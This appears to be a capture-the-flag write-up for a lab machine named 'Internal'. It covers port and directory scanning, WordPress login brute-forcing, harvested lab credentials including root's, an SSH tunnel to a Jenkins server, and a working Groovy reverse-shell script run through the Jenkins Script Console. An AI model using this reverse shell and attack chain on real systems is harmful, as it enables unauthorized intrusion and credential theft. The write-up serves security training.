# nmap

```shell
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-13 14:22 IST
Warning: 10.10.234.8 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.234.8
Host is up (0.16s latency).
Not shown: 65372 closed tcp ports (conn-refused), 161 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## gobuster

```shell
/blog                 (Status: 301) [Size: 309] [--> http://10.10.234.8/blog/]
/wordpress            (Status: 301) [Size: 314] [--> http://10.10.234.8/wordpress/]
/javascript           (Status: 301) [Size: 315] [--> http://10.10.234.8/javascript/]
/phpmyadmin           (Status: 301) [Size: 315] [--> http://10.10.234.8/phpmyadmin/]

```

Adding in the etc/hosts    `10.10.234.8     internal.thm`

**Found php login page**       `<ip>/phpmyadmin/index.php`

![image-20220513153950121](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220513153950121.png)

**Found wordpress login**      `http://internal.thm/blog/wp-login.php`

![image-20220513153820002](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220513153820002.png)

using `wpsacntool` found valid password

Username: `admin`, Password: `my2boys`

![image-20220515150234918](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220515150234918.png)

found Will’s credentials. `william:arnold147`

![image-20220515151342046](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220515151342046.png)

running `linpieas` found username and password for this page `/phpmyadmin/index.php`

`dbpass='B2Ud4fEOZmVq'; $dbuser='phpmyadmin'`

![image-20220515153804025](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220515153804025.png)

looked further and found password for` aubreanna` in  `/opt/wp-save.txt`

`aubreanna:bubb13guM!@#123`
found running internal server on `172.17.0.1:8080`

using ssh tennling `ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.225.133`

found its running jenkins server after bruteforceing  founf credentials

`admin:spongebob`

got the reverse shell by running Script Console with 

```groovy
String host="localhost";
int port=8044;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

found root password in `/opt/note.txt`

`root:tr0ub13guM!@#123`
